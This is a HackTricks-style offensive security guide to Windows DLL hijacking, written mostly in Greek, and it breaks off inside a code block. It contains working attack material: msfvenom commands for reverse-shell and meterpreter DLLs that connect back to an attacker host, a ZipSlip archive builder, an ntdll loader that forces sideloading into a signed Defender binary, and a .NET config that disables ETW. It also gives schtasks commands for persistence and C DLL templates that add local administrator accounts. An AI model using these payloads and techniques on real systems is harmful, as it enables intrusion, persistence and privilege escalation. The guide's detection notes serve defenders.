# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

Το DLL Hijacking περιλαμβάνει τον χειρισμό μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος αυτός καλύπτει διάφορες τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για code execution, επίτευξη persistence και, λιγότερο συχνά, privilege escalation. Παρότι εδώ η έμφαση είναι στην escalation, η μέθοδος του hijacking παραμένει η ίδια σε όλους τους στόχους.

### Common Techniques

Χρησιμοποιούνται αρκετές μέθοδοι για DLL hijacking, καθεμία με την αποτελεσματικότητά της να εξαρτάται από τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά με χρήση DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης πριν από το νόμιμο, εκμεταλλευόμενοι το μοτίβο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL για να το φορτώσει μια εφαρμογή, θεωρώντας ότι πρόκειται για ένα ανύπαρκτο απαιτούμενο DLL.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως `%PATH%` ή αρχείων `.exe.manifest` / `.exe.local` ώστε να κατευθυνθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίγραφο στον κατάλογο WinSxS, μια μέθοδος που συχνά συνδέεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε κατάλογο που ελέγχει ο χρήστης μαζί με την αντιγραμμένη εφαρμογή, παρόμοιο με τεχνικές Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Το κλασικό DLL sideloading δεν είναι ο μόνος τρόπος για να αναγκάσεις μια αξιόπιστη διεργασία **.NET Framework** να φορτώσει attacker code. Αν το target executable είναι μια **managed** εφαρμογή, το CLR ελέγχει επίσης ένα **application configuration file** με όνομα βασισμένο στο εκτελέσιμο (για παράδειγμα `Setup.exe.config`). Αυτό το αρχείο μπορεί να ορίσει ένα προσαρμοσμένο **AppDomainManager**. Αν το config δείχνει σε ένα attacker-controlled assembly τοποθετημένο δίπλα στο EXE, το CLR το φορτώνει **before the application's normal code path** και εκτελείται μέσα στην αξιόπιστη διεργασία.

Σύμφωνα με το schema ρύθμισης του .NET Framework της Microsoft, τόσο το `<appDomainManagerAssembly>` όσο και το `<appDomainManagerType>` πρέπει να υπάρχουν για να χρησιμοποιηθεί ο custom manager.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Ελάχιστος manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Πρακτικές σημειώσεις:
- Αυτό είναι tradecraft συγκεκριμένο για **.NET Framework**. Εξαρτάται από το CLR config parsing, όχι από το Win32 DLL search order.
- Το host πρέπει πραγματικά να είναι ένα **managed EXE**. Γρήγορο triage: `sigcheck -m target.exe`, `corflags target.exe`, ή έλεγχος για το **CLR Runtime Header** στα PE metadata.
- Το όνομα του config file πρέπει να ταιριάζει ακριβώς με το όνομα του executable (`<binary>.config`) και συνήθως βρίσκεται **δίπλα στο EXE**.
- Αυτό είναι χρήσιμο με **signed Microsoft/vendor binaries** επειδή το trusted EXE παραμένει άθικτο ενώ το malicious managed assembly εκτελείται in-process.
- Αν ήδη έχεις writable installer/update directory, το AppDomainManager hijacking μπορεί να χρησιμοποιηθεί ως το **first stage**, και μετά να ακολουθήσει κλασικό DLL sideloading ή reflective loading για τα επόμενα stages.

### AppDomainManager as a downloader + scheduled-task bootstrap

Ένα πρακτικό intrusion pattern είναι να συνδυάσεις το trusted managed EXE με ένα malicious `*.config` και ένα malicious AppDomainManager DLL που λειτουργεί μόνο ως ένα **μικρό bootstrapper**:

1. Ο user εκκινεί ένα signed .NET installer ή updater από μια πειστική τοποθεσία όπως `%USERPROFILE%\Downloads`.
2. Το adjacent config κάνει το CLR να φορτώσει το attacker assembly **πριν** ξεκινήσει η legitimate app logic.
3. Ο malicious manager εκτελεί ένα **path gate** (για παράδειγμα, συνεχίζει μόνο αν το host EXE τρέχει από `Downloads`, και αφήνει το second stage να τρέξει μόνο από `%LOCALAPPDATA%`).
4. Αν ο έλεγχος περάσει, κατεβάζει το real payload σε ένα user-writable path όπως `%LOCALAPPDATA%\PerfWatson2.exe` και εγκαθιστά persistence με ένα scheduled task.

Γιατί έχει σημασία αυτή η παραλλαγή:
- Το signed host EXE παραμένει αμετάβλητο, οπότε το triage που κάνει hash μόνο στο main binary μπορεί να χάσει το compromise.
- Το απλό **path-based anti-analysis** είναι συνηθισμένο: η μετακίνηση του ZIP/EXE/DLL triad σε Desktop, Temp ή sandbox path μπορεί σκόπιμα να σπάσει την αλυσίδα.
- Το first-stage AppDomainManager DLL μπορεί να μείνει μικρό και χαμηλού θορύβου ενώ το real implant ανακτάται αργότερα.

Minimal persistence example frequently seen with this pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Σημειώσεις:
- ` /rl highest` σημαίνει **highest available** για εκείνο το user/session· δεν είναι από μόνο του εγγυημένη SYSTEM escalation.
- Αυτή η technique συχνά κατηγοριοποιείται καλύτερα ως **execution/persistence via .NET config abuse** παρά ως κλασικό missing-DLL search-order hijacking, παρότι οι operators συχνά τα συνδυάζουν.

Detection pivots:
- Signed .NET executables που εκκινούν από **ZIP extraction paths**, `Downloads`, `%TEMP%`, ή άλλους user-writable folders με ένα **colocated** `<exe>.config`.
- Νέα scheduled tasks των οποίων το action δείχνει μέσα σε `%LOCALAPPDATA%`, `%APPDATA%`, ή `Downloads` και των οποίων τα ονόματα μιμούνται browser/vendor updaters.
- Short-lived managed bootstrap processes που αμέσως κατεβάζουν άλλο EXE, και μετά εκκινούν `schtasks.exe`.
- Samples που τερματίζονται νωρίς εκτός αν το executable path ταιριάζει με ένα αναμενόμενο user-profile directory.

### Hijacking an existing scheduled task to relaunch the sideload chain

Για persistence, μην κοιτάς μόνο το **creating a new task**. Κάποια intrusion sets περιμένουν μέχρι ένας legit installer να δημιουργήσει ένα **normal updater task** και μετά να **rewrite the task action** ώστε το υπάρχον name, author και trigger να φαίνονται οικεία στους defenders.

Reusable workflow:
1. Install/run το legit software και εντόπισε το task που συνήθως δημιουργεί.
2. Export το task XML και σημείωσε τις τρέχουσες τιμές `<Exec><Command>` / `<Arguments>`.
3. Αντικατάστησε μόνο το action ώστε το task να εκκινεί το **trusted host EXE** σου από ένα user-writable staging directory, το οποίο μετά side-loads ή AppDomain-loads το πραγματικό payload.
4. Re-register το ίδιο task name αντί να δημιουργήσεις ένα νέο, προφανές persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Γιατί είναι πιο stealthy:
- Το όνομα του task μπορεί να φαίνεται ακόμα legit (για παράδειγμα ένας vendor updater).
- Το **Task Scheduler service** το εκκινεί, οπότε η επαλήθευση parent/ancestor συχνά βλέπει την αναμενόμενη scheduling chain αντί για `explorer.exe`.
- Οι ομάδες DFIR που ψάχνουν μόνο για **new task names** μπορεί να χάσουν ένα task του οποίου το registration υπήρχε ήδη, αλλά το action του τώρα δείχνει σε `%LOCALAPPDATA%`, `%APPDATA%` ή σε άλλο attacker-controlled path.

Γρήγορα hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Σύγκρινε τα `C:\Windows\System32\Tasks\*` XML και τα `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata με ένα baseline.
- Κάνε alert όταν ένα **vendor-looking updater task** εκτελείται από **user-writable directories** ή εκκινεί ένα .NET EXE με ένα colocated `*.config` file.

> [!TIP]
> Για μια βήμα-βήμα chain που συνδυάζει HTML staging, AES-CTR configs και .NET implants πάνω από DLL sideloading, δες το workflow παρακάτω.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Ο πιο συνηθισμένος τρόπος για να βρεις missing Dlls μέσα σε ένα system είναι να τρέξεις το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ορίζοντας** τα **παρακάτω 2 filters**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

και να εμφανίσεις μόνο το **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Αν ψάχνεις για **missing dlls γενικά**, άφησέ το να τρέχει για μερικά **seconds**.\
Αν ψάχνεις για ένα **missing dll μέσα σε συγκεκριμένο executable**, πρέπει να βάλεις **άλλο filter όπως "Process Name" "contains" `<exec name>`, να το εκτελέσεις και να σταματήσεις την καταγραφή events**.

## Exploiting Missing Dlls

Για να κάνουμε privilege escalation, η καλύτερη ευκαιρία που έχουμε είναι να μπορέσουμε να **γράψουμε ένα dll που ένα privilege process θα προσπαθήσει να φορτώσει** σε κάποιο από τα **σημεία όπου θα αναζητηθεί**. Άρα, θα μπορέσουμε να **γράψουμε** ένα dll σε έναν **folder** όπου το **dll αναζητείται πριν** από τον folder όπου βρίσκεται το **original dll** (weird case), ή θα μπορέσουμε να **γράψουμε** σε κάποιον folder όπου το dll θα αναζητηθεί και το original **dll** δεν υπάρχει σε κανέναν folder.

### Dll Search Order

**Μέσα στην** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείς να βρεις πώς φορτώνονται συγκεκριμένα τα Dlls.**

Οι **Windows applications** αναζητούν DLLs ακολουθώντας ένα σύνολο από **pre-defined search paths**, με συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα malicious DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους directories, εξασφαλίζοντας ότι θα φορτωθεί πριν από το authentic DLL. Ένας τρόπος για να το αποτρέψεις αυτό είναι η εφαρμογή να χρησιμοποιεί absolute paths όταν αναφέρεται στα DLLs που χρειάζεται.

Μπορείς να δεις το **DLL search order σε 32-bit** συστήματα παρακάτω:

1. Το directory από το οποίο φορτώθηκε η application.
2. Το system directory. Χρησιμοποίησε τη συνάρτηση [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) για να πάρεις το path αυτού του directory.(_C:\Windows\System32_)
3. Το 16-bit system directory. Δεν υπάρχει συνάρτηση που να παίρνει το path αυτού του directory, αλλά γίνεται search. (_C:\Windows\System_)
4. Το Windows directory. Χρησιμοποίησε τη συνάρτηση [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) για να πάρεις το path αυτού του directory.
1. (_C:\Windows_)
5. Το current directory.
6. Τα directories που αναφέρονται στη PATH environment variable. Πρόσεξε ότι αυτό δεν περιλαμβάνει το per-application path που ορίζεται από το registry key **App Paths**. Το key **App Paths** δεν χρησιμοποιείται όταν υπολογίζεται το DLL search path.

Αυτή είναι η **default** σειρά αναζήτησης με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, το current directory ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσεις αυτό το feature, δημιούργησε το registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και όρισέ το σε 0 (default είναι enabled).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) καλείται με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά στο directory του executable module που το **LoadLibraryEx** φορτώνει.

Τέλος, πρόσεξε ότι **ένα dll μπορεί να φορτωθεί αν δοθεί το absolute path αντί απλώς το name**. Σε αυτή την περίπτωση το dll αυτό **θα αναζητηθεί μόνο σε εκείνο το path** (αν το dll έχει dependencies, θα αναζητηθούν όπως ακριβώς αν είχαν φορτωθεί by name).

Υπάρχουν και άλλοι τρόποι για να αλλάξεις τη σειρά αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Χρησιμοποίησε **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) για να συλλέξεις DLL names που το process δοκιμάζει αλλά δεν βρίσκει.
2. Αν το binary τρέχει σε **schedule/service**, το να ρίξεις ένα DLL με ένα από αυτά τα names στο **application directory** (search-order entry #1) θα το φορτώσει στην επόμενη εκτέλεση. Σε ένα .NET scanner case το process έψαχνε για `hostfxr.dll` στο `C:\samples\app\` πριν φορτώσει το πραγματικό copy από `C:\Program Files\dotnet\fxr\...`.
3. Φτιάξε ένα payload DLL (π.χ. reverse shell) με οποιοδήποτε export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Αν το primitive σου είναι ένα **ZipSlip-style arbitrary write**, φτιάξε ένα ZIP του οποίου το entry ξεφεύγει από το extraction dir ώστε το DLL να καταλήξει στο app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Παραδώστε το archive στο watched inbox/share; όταν το scheduled task επανεκκινήσει το process, αυτό φορτώνει το malicious DLL και εκτελεί τον κώδικά σας ως το service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας πιο προχωρημένος τρόπος για να επηρεάσετε ντετερμινιστικά το DLL search path ενός newly created process είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS όταν δημιουργείτε το process με τις native APIs του ntdll. Παρέχοντας εδώ έναν directory υπό τον έλεγχο του attacker, ένα target process που επιλύει ένα imported DLL by name (χωρίς absolute path και χωρίς τα safe loading flags) μπορεί να αναγκαστεί να φορτώσει ένα malicious DLL από αυτόν τον directory.

Key idea
- Δημιουργήστε τα process parameters με RtlCreateProcessParametersEx και δώστε ένα custom DllPath που δείχνει στον controlled folder σας (π.χ. το directory όπου βρίσκεται το dropper/unpacker σας).
- Δημιουργήστε το process με RtlCreateUserProcess. Όταν το target binary επιλύει ένα DLL by name, ο loader θα χρησιμοποιήσει αυτό το supplied DllPath κατά την επίλυση, επιτρέποντας αξιόπιστο sideloading ακόμη και όταν το malicious DLL δεν βρίσκεται δίπλα στο target EXE.

Notes/limitations
- Αυτό επηρεάζει το child process που δημιουργείται· είναι διαφορετικό από το SetDllDirectory, το οποίο επηρεάζει μόνο το current process.
- Το target πρέπει να κάνει import ή LoadLibrary ένα DLL by name (χωρίς absolute path και χωρίς LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και τα hardcoded absolute paths δεν μπορούν να hijacked. Τα forwarded exports και το SxS μπορεί να αλλάξουν την precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα operational χρήσης
- Τοποθέτησε ένα malicious xmllite.dll (που κάνει export τις απαιτούμενες functions ή κάνει proxy στο πραγματικό) στον κατάλογο DllPath σου.
- Εκκίνησε ένα signed binary που είναι γνωστό ότι αναζητά το xmllite.dll με βάση το όνομα χρησιμοποιώντας την παραπάνω technique. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και κάνει sideload το DLL σου.

Αυτή η technique έχει παρατηρηθεί in-the-wild ότι οδηγεί σε multi-stage sideloading chains: ένας αρχικός launcher ρίχνει ένα helper DLL, το οποίο στη συνέχεια εκκινεί ένα Microsoft-signed, hijackable binary με ένα custom DllPath για να επιβάλει τη φόρτωση του DLL του attacker από έναν staging directory.


### .NET AppDomainManager hijacking via `.exe.config`

Για **.NET Framework** targets, το sideloading μπορεί να γίνει **πριν το `Main()`** χωρίς patching memory, εκμεταλλευόμενος το adjacent **`.exe.config`** file της εφαρμογής. Αντί να βασίζεται μόνο στο Win32 DLL search order, ο attacker τοποθετεί ένα legitimate .NET EXE δίπλα σε ένα malicious config και ένα ή περισσότερα attacker-controlled assemblies.

Πώς λειτουργεί η αλυσίδα:
1. Το host EXE ξεκινά και το **CLR διαβάζει το `<exe>.config`**.
2. Το config ορίζει **`<appDomainManagerAssembly>`** και **`<appDomainManagerType>`** έτσι ώστε το runtime να instantiates ένα attacker-controlled `AppDomainManager`.
3. Ο malicious manager αποκτά **pre-`Main()` execution** μέσα στο trusted host process.
4. Το ίδιο config μπορεί να αναγκάσει το CLR να επιλύει πρώτα local assemblies (για παράδειγμα `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) και μπορεί να αποδυναμώσει runtime validation/telemetry χωρίς inline patching.

Campaign-style pattern (το ακριβές nesting μπορεί να διαφέρει ανά directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** διατηρεί την ανάλυση assemblies στον κατάλογο της εφαρμογής, μετατρέποντας τον φάκελο σε προβλέψιμη επιφάνεια sideloading.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** μεταφέρουν την εκτέλεση σε attacker code κατά την αρχικοποίηση του CLR, πριν τρέξει η νόμιμη λογική της εφαρμογής.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** μπορεί να επιτρέψει σε ένα full-trust app να φορτώσει unsigned ή tampered assemblies χωρίς αποτυχία strong-name validation.
- **`<publisherPolicy apply="no"/>`** αποφεύγει publisher-policy redirects προς νεότερα assemblies.
- **`<requiredRuntime ... safemode="true"/>`** κάνει την επιλογή runtime πιο ντετερμινιστική.
- **`<etwEnable enabled="false"/>`** είναι ιδιαίτερα ενδιαφέρον γιατί το **CLR απενεργοποιεί το δικό του ETW visibility** από τη διαμόρφωση αντί το implant να κάνει patch το `EtwEventWrite` στη μνήμη.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα permissions όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός εκτελέσιμου και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό σχετικά με το πώς να **abuse Dll Hijacking to escalate privileges** με δικαιώματα εγγραφής σε έναν **System Path folder** δες:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)θα ελέγξει αν έχεις δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα automated tools για να ανακαλύψεις αυτή την ευπάθεια είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Example

Σε περίπτωση που βρεις ένα exploitable scenario, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείς επιτυχώς θα ήταν να **create a dll that exports at least all the functions the executable will import from it**. Σε κάθε περίπτωση, σημείωσε ότι το Dll Hijacking είναι χρήσιμο για να [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείς να βρεις ένα παράδειγμα για το **how to create a valid dll** μέσα σε αυτή τη μελέτη για dll hijacking που επικεντρώνεται στο dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **next sectio**n μπορείς να βρεις μερικούς **basic dll codes** που ίσως είναι χρήσιμοι ως **templates** ή για να δημιουργήσεις ένα **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Βασικά ένα **Dll proxy** είναι ένα Dll ικανό να **execute your malicious code when loaded** αλλά και να **expose** και να **work** όπως αναμένεται, **relaying all the calls to the real library**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείς πράγματι να **indicate an executable and select the library** που θέλεις να proxify και να **generate a proxified dll** ή να **indicate the Dll** και να **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Πάρε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργία χρήστη (x86 δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Δικό σου

Σημειώστε ότι σε αρκετές περιπτώσεις το Dll που κάνετε compile πρέπει να **export several functions** που θα φορτωθούν από τη διεργασία-θύμα· αν αυτές οι functions δεν υπάρχουν, το **binary won't be able to load** them και το **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

